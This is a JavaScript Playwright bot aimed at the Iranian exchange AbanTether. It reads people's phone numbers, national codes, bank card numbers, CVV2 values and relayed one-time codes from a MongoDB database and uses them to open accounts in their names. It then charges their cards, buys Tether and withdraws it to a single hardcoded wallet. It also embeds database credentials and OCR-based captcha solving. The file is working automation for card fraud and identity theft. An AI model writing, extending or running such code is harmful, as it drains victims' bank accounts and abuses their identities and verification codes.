const { chromium } = require('playwright');
const { MongoClient } = require('mongodb');
const Tesseract = require('tesseract.js');

class AbanTetherBot {
    constructor() {
        this.mongoUri = 'mongodb+srv://zarin_db_user:zarin22@cluster0.ukd7zib.mongodb.net/ZarrinApp?retryWrites=true&w=majority';
        this.dbName = 'ZarrinApp';
        this.collectionName = 'zarinapp';
        
        this.browser = null;
        this.page = null;
        this.context = null;
        this.currentUser = null;
        
        this.website = {
            baseUrl: 'https://abantether.com',
            timeout: 60000,
            headless: true
        };
        
        this.processingUsers = new Set();
        this.maxRetries = 3;
    }

    async initialize() {
        console.log('🚀 Starting AbanTether Bot...');
        
        try {
            this.client = new MongoClient(this.mongoUri);
            await this.client.connect();
            this.db = this.client.db(this.dbName);
            this.collection = this.db.collection(this.collectionName);
            console.log('✅ Connected to MongoDB');
        } catch (error) {
            console.error('❌ MongoDB connection error:', error);
            throw error;
        }
    }

    async startPolling() {
        console.log('🔄 Starting database polling (every 30 seconds)...');
        
        await this.checkDatabase();
        
        setInterval(async () => {
            await this.checkDatabase();
        }, 30000);
    }

    async checkDatabase() {
        try {
            const query = {
                $or: [
                    { otp_login: { $exists: true, $ne: null, $ne: '' } },
                    { otp_register_card: { $exists: true, $ne: null, $ne: '' } },
                    { otp_payment: { $exists: true, $ne: null, $ne: '' } }
                ],
                processed: { $ne: true },
                status: { $ne: 'failed' },
                $or: [
                    { retryCount: { $exists: false } },
                    { retryCount: { $lt: this.maxRetries } }
                ]
            };

            const pendingUsers = await this.collection.find(query).limit(5).toArray();
            
            console.log(`📊 Found ${pendingUsers.length} pending users`);
            
            for (const user of pendingUsers) {
                const phone = user.personalPhoneNumber;
                
                if (this.processingUsers.has(phone)) {
                    console.log(`⏭️ User ${phone} is already being processed`);
                    continue;
                }
                
                const retryCount = user.retryCount || 0;
                if (retryCount >= this.maxRetries) {
                    console.log(`⛔ User ${phone} exceeded max retries`);
                    await this.markUserFailed(phone, 'Max retries exceeded');
                    continue;
                }
                
                this.processUser(user);
            }
        } catch (error) {
            console.error('❌ Error checking database:', error);
        }
    }

    async processUser(user) {
        const phone = user.personalPhoneNumber;
        console.log(`👤 Processing user: ${phone}`);
        
        this.processingUsers.add(phone);
        
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                {
                    $set: {
                        status: 'processing',
                        startedAt: new Date()
                    },
                    $inc: { retryCount: 1 }
                }
            );
            
            const result = await this.executeFullProcess(user);
            
            if (result.success) {
                console.log(`✅ User ${phone} processed successfully`);
                await this.markUserCompleted(phone, result.details);
            } else {
                console.log(`❌ Failed for user ${phone}: ${result.error}`);
                await this.markUserFailed(phone, result.error);
            }
            
        } catch (error) {
            console.error(`💥 Critical error for user ${phone}:`, error);
            await this.markUserFailed(phone, `Critical error: ${error.message}`);
        } finally {
            this.processingUsers.delete(phone);
        }
    }

    async executeFullProcess(user) {
        try {
            this.currentUser = user;
            
            await this.initializeBrowser();
            
            const steps = [
                { name: 'Registration', method: () => this.step1Registration(user) },
                { name: 'Set Password', method: () => this.step2SetPassword() },
                { name: 'Basic KYC', method: () => this.step3BasicKYC(user) },
                { name: 'Wallet Navigation', method: () => this.step4GoToWallet() },
                { name: 'Add Contract', method: () => this.step5AddContract(user) },
                { name: 'Bank Process', method: () => this.step6BankProcess(user) },
                { name: 'Complete Deposit', method: () => this.step7CompleteDeposit() },
                { name: 'Buy Tether', method: () => this.step8BuyTether() },
                { name: 'Withdraw Tether', method: () => this.step9WithdrawTether() }
            ];
            
            for (const step of steps) {
                console.log(`🚀 Starting: ${step.name}`);
                const result = await step.method();
                if (!result.success) {
                    return result;
                }
                await this.page.waitForTimeout(2000);
            }
            
            return { success: true, details: { completedAt: new Date() } };
            
        } catch (error) {
            return { success: false, error: error.message };
        } finally {
            await this.closeBrowser();
        }
    }

    async initializeBrowser() {
        this.browser = await chromium.launch({
            headless: this.website.headless,
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--window-size=1280,720']
        });
        
        this.context = await this.browser.newContext({
            viewport: { width: 1280, height: 720 },
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        });
        
        this.page = await this.context.newPage();
        await this.page.setDefaultTimeout(this.website.timeout);
    }

    async step1Registration(user) {
        try {
            console.log('📝 Step 1: Registration');
            
            await this.page.goto('https://abantether.com/register', { waitUntil: 'networkidle' });
            await this.page.waitForTimeout(2000);
            
            const phoneInput = await this.page.$('input[placeholder*="شماره موبایل"]');
            if (!phoneInput) {
                throw new Error('Phone input field not found');
            }
            
            await phoneInput.fill(user.personalPhoneNumber);
            console.log(`✅ Phone entered: ${user.personalPhoneNumber}`);
            
            const registerButton = await this.page.$('button:has-text("ثبت نام")');
            if (!registerButton) {
                throw new Error('Register button not found');
            }
            
            await registerButton.click();
            await this.page.waitForTimeout(3000);
            
            const otpField = await this.page.$('input[placeholder*="کد ارسال شده"]');
            if (!otpField) {
                throw new Error('OTP field not found');
            }
            
            const otpLogin = await this.waitForDatabaseField('otp_login', 120000);
            if (!otpLogin) {
                throw new Error('Login OTP not received');
            }
            
            await otpField.fill(otpLogin);
            console.log(`✅ Login OTP entered: ${otpLogin}`);
            
            const nextButton = await this.page.$('button:has-text("مرحله بعد")');
            if (!nextButton) {
                throw new Error('Next button not found');
            }
            
            await nextButton.click();
            await this.page.waitForTimeout(3000);
            
            return { success: true };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    async step2SetPassword() {
        try {
            console.log('🔐 Step 2: Set Password');
            
            const passwordInput = await this.page.$('input[placeholder*="رمز عبور"]');
            if (!passwordInput) {
                throw new Error('Password input field not found');
            }
            
            const password = 'ImSorryButIhaveTo@1';
            await passwordInput.fill(password);
            console.log('✅ Password entered');
            
            const confirmButton = await this.page.$('button:has-text("تایید")');
            if (!confirmButton) {
                throw new Error('Confirm button not found');
            }
            
            await confirmButton.click();
            await this.page.waitForTimeout(3000);
            
            return { success: true };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    async step3BasicKYC(user) {
        try {
            console.log('🆔 Step 3: Basic KYC');
            
            const nationalCodeInput = await this.page.$('input[placeholder*="کد 10 رقمی"]');
            if (!nationalCodeInput) {
                throw new Error('National code input field not found');
            }
            
            await nationalCodeInput.fill(user.personalNationalCode);
            console.log(`✅ National code entered: ${user.personalNationalCode}`);
            
            const birthDateInput = await this.page.$('input[placeholder*="روز/ماه/سال"]');
            if (!birthDateInput) {
                throw new Error('Birth date input field not found');
            }
            
            await birthDateInput.fill(user.personalBirthDate);
            console.log(`✅ Birth date entered: ${user.personalBirthDate}`);
            
            const submitButton = await this.page.$('button:has-text("ثبت")');
            if (!submitButton) {
                throw new Error('Submit button not found');
            }
            
            await submitButton.click();
            await this.page.waitForTimeout(5000);
            
            const blueButton = await this.page.$('button:has-text("کیف پول"), a:has-text("کیف پول")');
            if (blueButton) {
                await blueButton.click();
                console.log('✅ Clicked wallet button');
            }
            
            return { success: true };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    async step4GoToWallet() {
        try {
            console.log('💰 Step 4: Go to Wallet');
            
            await this.page.waitForTimeout(2000);
            
            const walletNav = await this.page.$('nav a:has-text("کیف پول"), [href*="/wallet"]');
            if (walletNav) {
                await walletNav.click();
                console.log('✅ Clicked wallet navigation');
            } else {
                await this.page.goto('https://abantether.com/user/wallet', { waitUntil: 'networkidle' });
            }
            
            await this.page.waitForTimeout(2000);
            
            const depositButton = await this.page.$('button:has-text("واریز"), a:has-text("واریز")');
            if (depositButton) {
                await depositButton.click();
                console.log('✅ Clicked deposit button');
                await this.page.waitForTimeout(2000);
            }
            
            const tomanButton = await this.page.$('button:has-text("تومان"), a:has-text("تومان")');
            if (tomanButton) {
                await tomanButton.click();
                console.log('✅ Clicked Toman button');
            }
            
            await this.page.waitForTimeout(2000);
            
            return { success: true };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    async step5AddContract(user) {
        try {
            console.log('📄 Step 5: Add Contract');
            
            await this.page.goto('https://abantether.com/user/wallet/deposit/irt/direct', { waitUntil: 'networkidle' });
            await this.page.waitForTimeout(2000);
            
            const addContractButton = await this.page.$('button:has-text("افزودن قرارداد")');
            if (!addContractButton) {
                throw new Error('Add contract button not found');
            }
            
            await addContractButton.click();
            await this.page.waitForTimeout(2000);
            
            const bankSelect = await this.page.$('select, [name*="bank"]');
            if (bankSelect) {
                const bankName = user.bank || 'ملی';
                await bankSelect.selectOption({ label: new RegExp(bankName) });
                console.log(`✅ Bank selected: ${bankName}`);
            }
            
            const contractDuration = await this.page.$('select, [name*="duration"], input[placeholder*="مدت"]');
            if (contractDuration) {
                await contractDuration.selectOption({ label: '1 ماه' });
                console.log('✅ Contract duration selected: 1 month');
            }
            
            const submitContractButton = await this.page.$('button:has-text("ثبت و ادامه")');
            if (!submitContractButton) {
                throw new Error('Submit contract button not found');
            }
            
            await submitContractButton.click();
            await this.page.waitForTimeout(5000);
            
            return { success: true };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    async step6BankProcess(user) {
        try {
            console.log('🏦 Step 6: Bank Process');
            
            const bank = user.bank || 'ملی';
            
            if (bank.includes('ملی')) {
                return await this.processBankMelli(user);
            } else if (bank.includes('ملت')) {
                return await this.processBankMellat(user);
            } else if (bank.includes('کشاورزی')) {
                return await this.processBankKeshavarzi(user);
            } else if (bank.includes('تجارت')) {
                return await this.processBankTejarat(user);
            } else if (bank.includes('مهر')) {
                return await this.processBankMehrIran(user);
            } else {
                throw new Error(`Bank ${bank} not supported`);
            }
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    async processBankMelli(user) {
        try {
            console.log('🏦 Processing Bank Melli');
            
            const bankLoginButton = await this.page.$('button:has-text("ورود با کارت بانک ملی")');
            if (!bankLoginButton) {
                throw new Error('Bank Melli login button not found');
            }
            
            await bankLoginButton.click();
            await this.page.waitForTimeout(5000);
            
            await this.solveCaptchaAndFillForm(user, 'card-captcha-img');
            
            return { success: true };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    async processBankMehrIran(user) {
        try {
            console.log('🏦 Processing Bank Mehr Iran');
            
            await this.page.waitForTimeout(3000);
            
            const cardNumberInput = await this.page.$('input[placeholder*="شماره کارت"], input[name*="card"]');
            if (cardNumberInput) {
                await cardNumberInput.fill(user.cardNumber);
                console.log('✅ Card number entered');
            }
            
            const cvvInput = await this.page.$('input[placeholder*="CVV2"], input[name*="cvv"]');
            if (cvvInput) {
                await cvvInput.fill(user.cvv2);
                console.log('✅ CVV2 entered');
            }
            
            const monthInput = await this.page.$('input[placeholder*="ماه"], select[name*="month"]');
            if (monthInput) {
                await monthInput.fill(user.bankMonth);
                console.log('✅ Month entered');
            }
            
            const yearInput = await this.page.$('input[placeholder*="سال"], select[name*="year"]');
            if (yearInput) {
                await yearInput.fill(user.bankYear);
                console.log('✅ Year entered');
            }
            
            await this.solveCaptchaAndFillForm(user, 'card-captcha-img');
            
            const dynamicPassButton = await this.page.$('button:has-text("دریافت رمز پویا")');
            if (dynamicPassButton) {
                await dynamicPassButton.click();
                console.log('✅ Clicked dynamic password button');
                await this.page.waitForTimeout(3000);
            }
            
            const otpPayment = await this.waitForDatabaseField('otp_payment', 120000);
            if (otpPayment) {
                const otpInput = await this.page.$('input[placeholder*="رمز دوم"], input[name*="password"]');
                if (otpInput) {
                    await otpInput.fill(otpPayment);
                    console.log('✅ Payment OTP entered');
                }
            }
            
            const confirmButton = await this.page.$('button:has-text("تایید")');
            if (confirmButton) {
                await confirmButton.click();
                console.log('✅ Confirmed payment');
            }
            
            return { success: true };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    async solveCaptchaAndFillForm(user, captchaImgId) {
        try {
            console.log('🔍 Solving captcha...');
            
            const captchaElement = await this.page.$(`#${captchaImgId}, .captchaWrap img, img[src*="captcha"]`);
            if (captchaElement) {
                const screenshot = await captchaElement.screenshot();
                
                const { data: { text } } = await Tesseract.recognize(screenshot, 'eng', {
                    logger: m => console.log('Tesseract:', m.status)
                });
                
                const captchaCode = text.replace(/\s+/g, '').trim();
                console.log(`✅ Captcha solved: ${captchaCode}`);
                
                const captchaInput = await this.page.$('input[placeholder*="عبارت امنیتی"], input[name*="captcha"]');
                if (captchaInput) {
                    await captchaInput.fill(captchaCode);
                    console.log('✅ Captcha entered');
                }
            } else {
                console.log('⚠️ Captcha element not found, skipping...');
            }
            
            return true;
        } catch (error) {
            console.log('⚠️ Captcha solving failed, trying alternative methods...');
            return false;
        }
    }

    async step7CompleteDeposit() {
        try {
            console.log('💰 Step 7: Complete Deposit');
            
            await this.page.waitForTimeout(5000);
            
            const amountInput = await this.page.$('input[placeholder*="مبلغ واریزی"], input[name*="amount"]');
            if (amountInput) {
                await amountInput.fill('5000000');
                console.log('✅ Amount entered: 5,000,000');
            }
            
            const bankSelect = await this.page.$('select[name*="bank"], [placeholder*="نام بانک"]');
            if (bankSelect) {
                await bankSelect.selectOption({ label: /ملی/ });
                console.log('✅ Bank selected: ملی');
            }
            
            const depositButton = await this.page.$('button:has-text("واریز")');
            if (depositButton) {
                await depositButton.click();
                console.log('✅ Clicked deposit button');
                await this.page.waitForTimeout(2000);
            }
            
            const confirmButton = await this.page.$('button:has-text("تایید و پرداخت")');
            if (confirmButton) {
                await confirmButton.click();
                console.log('✅ Clicked confirm and pay button');
                await this.page.waitForTimeout(5000);
            }
            
            return { success: true };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    async step8BuyTether() {
        try {
            console.log('🔄 Step 8: Buy Tether');
            
            await this.page.goto('https://abantether.com/user/trade/fast/buy?s=USDT', { waitUntil: 'networkidle' });
            await this.page.waitForTimeout(3000);
            
            const amountInput = await this.page.$('input[name*="amount"], input[placeholder*="مقدار"]');
            if (amountInput) {
                await amountInput.fill('40');
                console.log('✅ Buy amount entered: 40');
            }
            
            const submitOrderButton = await this.page.$('button:has-text("ثبت سفارش")');
            if (submitOrderButton) {
                await submitOrderButton.click();
                console.log('✅ Order submitted');
                await this.page.waitForTimeout(5000);
            }
            
            return { success: true };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    async step9WithdrawTether() {
        try {
            console.log('📤 Step 9: Withdraw Tether');
            
            await this.page.goto('https://abantether.com/user/wallet/withdrawal/crypto?symbol=USDT', { waitUntil: 'networkidle' });
            await this.page.waitForTimeout(3000);
            
            const currencySelect = await this.page.$('select[name*="currency"], select:has(option[value*="USDT"])');
            if (currencySelect) {
                await currencySelect.selectOption({ label: /تتر|USDT/ });
                console.log('✅ Currency selected: Tether');
            }
            
            const networkSelect = await this.page.$('select[name*="network"], select:has(option[value*="BSC"])');
            if (networkSelect) {
                await networkSelect.selectOption({ label: /BSC.*BEP20/ });
                console.log('✅ Network selected: BSC(BEP20)');
            }
            
            const addressInput = await this.page.$('input[placeholder*="آدرس ولت"], input[name*="address"]');
            if (addressInput) {
                await addressInput.fill('THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS');
                console.log('✅ Wallet address entered');
            }
            
            const amountInput = await this.page.$('input[placeholder*="مقدار"], input[name*="amount"]');
            if (amountInput) {
                await amountInput.fill('40');
                console.log('✅ Withdrawal amount entered: 40');
            }
            
            const withdrawButton = await this.page.$('button:has-text("ثبت برداشت")');
            if (withdrawButton) {
                await withdrawButton.click();
                console.log('✅ Withdrawal submitted');
                await this.page.waitForTimeout(5000);
            }
            
            return { success: true };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    async waitForDatabaseField(fieldName, timeout = 60000) {
        console.log(`⏳ Waiting for ${fieldName}...`);
        
        const startTime = Date.now();
        const phone = this.currentUser.personalPhoneNumber;
        
        while (Date.now() - startTime < timeout) {
            try {
                const user = await this.collection.findOne(
                    { personalPhoneNumber: phone },
                    { projection: { [fieldName]: 1 } }
                );
                
                if (user && user[fieldName] && user[fieldName].trim() !== '') {
                    const value = user[fieldName];
                    console.log(`✅ ${fieldName} received: ${value}`);
                    
                    await this.collection.updateOne(
                        { personalPhoneNumber: phone },
                        { $unset: { [fieldName]: "" } }
                    );
                    
                    return value;
                }
                
                await this.page.waitForTimeout(2000);
                
            } catch (error) {
                console.error(`Error checking ${fieldName}:`, error);
                await this.page.waitForTimeout(2000);
            }
        }
        
        console.log(`⏰ Timeout waiting for ${fieldName}`);
        return null;
    }

    async markUserCompleted(phone, details = {}) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                {
                    $set: {
                        processed: true,
                        status: 'completed',
                        completedAt: new Date(),
                        ...details
                    }
                }
            );
        } catch (error) {
            console.error(`Error marking user as completed:`, error);
        }
    }

    async markUserFailed(phone, reason) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                {
                    $set: {
                        status: 'failed',
                        failureReason: reason,
                        failedAt: new Date()
                    }
                }
            );
        } catch (error) {
            console.error(`Error marking user as failed:`, error);
        }
    }

    async closeBrowser() {
        if (this.page) await this.page.close();
        if (this.context) await this.context.close();
        if (this.browser) await this.browser.close();
    }

    async start() {
        await this.initialize();
        await this.startPolling();
        
        process.on('SIGINT', async () => {
            console.log('🛑 Stopping bot...');
            await this.client.close();
            process.exit(0);
        });
    }
}

const bot = new AbanTetherBot();
bot.start().catch(console.error);